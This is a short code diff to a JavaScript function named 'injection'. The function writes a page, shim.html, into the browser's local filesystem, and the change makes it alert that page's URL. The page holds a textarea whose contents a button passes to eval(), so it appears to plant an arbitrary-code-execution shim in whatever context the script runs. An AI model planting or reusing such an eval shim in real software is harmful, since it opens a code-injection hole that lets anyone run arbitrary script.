@@ -9,13 +9,17 @@ function injection() {
                 fs.root.getFile(name, {create: true}, function (entry) {
                     entry.createWriter(function (writer) {
                         writer.write(new Blob([data]));
-                        writer.onwriteend = resolve;
+                        writer.onwriteend = function () {
+                            resolve(entry)
+                        }
                     });
                 })
             })
         }
-        await writeFile("shim.html", "<textarea></textarea><br/><button>Evaluate</button><script src=\"shim.js\"></script>");
+        var entry = await writeFile("shim.html", "<textarea></textarea><br/><button>Evaluate</button><script src=\"shim.js\"></script>");
+        alert(entry.toURL());
         await writeFile("shim.js", "document.querySelector('button').onclick = () => {eval(document.querySelector('textarea').value)};")
+
     })
     }
 }
